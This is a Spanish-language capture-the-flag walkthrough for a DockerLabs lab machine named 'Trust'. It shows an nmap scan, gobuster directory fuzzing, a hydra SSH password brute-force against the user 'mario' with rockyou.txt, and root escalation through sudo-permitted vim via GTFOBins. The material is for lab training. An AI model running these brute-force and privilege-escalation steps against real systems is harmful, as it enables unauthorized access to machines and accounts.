---
Nombre de la máquina: Trust
Sistema Operativo: Linux
Dificultad: Muy Facil 🟢

Enlace de descarga: https://dockerlabs.es
---

## Ejecutamos la maquina

Lo primero que debemos hacer es posicionarnos dentro de la ruta donde descargamos y extraimos la maquina y la ejecutamos con el siguiente comando.

```
sudo bash auto_deploy.sh trust.tar
```

![image](https://github.com/Cesmendaro/Dockerlabs.es/assets/153618246/c16ba732-c73f-45e3-99f6-20418d084296)

## Nmap.

Una vez tenemos la maquina funcioando, lanzamos un escaneo con nmap.

```
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

![image](https://github.com/Cesmendaro/Dockerlabs.es/assets/153618246/f175244f-74df-438e-8f73-75fbe3678345)

El escaneo nos dice que hay dos puertos abiertos, el 22 que corresponde al protocolo SSH, y el puerto 80, que tiene corriendo un apache versión 2.4.57, por lo que procedemos a revisar la aplicación web a ver con lo que nos encontramos.

![image](https://github.com/Cesmendaro/Dockerlabs.es/assets/153618246/7cbb281a-b793-42f5-aa2b-609e3639673b)


Simplemente se trata de la plantilla por defecto del apache, revisamos también su código fuente y no hay nada que nos llame la atencion, por lo que es el momento de realizar fuzzing.

## Fuzzing.

Realizamos el enscaneo de directorios con el diccionario `directory-list-lowercase-2.3-medium.txt y agregamos` y con el comando `-x` vamos a agregar las extensiones de archivos que nos interese buscar adicionalmente.

```
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/" -x .php,.sh,.py,.txt
```
![image](https://github.com/Cesmendaro/Dockerlabs.es/assets/153618246/826a5a63-2e29-4b91-ab22-74cf415a8937)

Nos encuentra el directorio `/secret.php` y miramos a ver que hay.



Se trata de un simple mensaje, pero ahora tenemos un nombre de usuario "Mario", procedemos a hacer un ataque de fuerza bruta con hydra al protocolo SSH.
`sudo hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`




Ahora que tenemos usuario y contrase;a procedemos a conectarnos por ssh.



Una vez accedemos estamos dentro de la maquina, solo falta escalar privilegios con el comando.
`sudo -l`



Nos dice que podemos ejecutar el binario "vim" como sudo, revisamos en gtfobins algun comando para escalar provilegios.



Solo falta pegar el comando que sacamos de gtfobins únicamente cambiando la ruta que aparece por la ruta absoluta.




Hecho esto ya somos usuario root, por ultimo hacemos el tratamiento de la tty.
`script /dev/null -c bash`


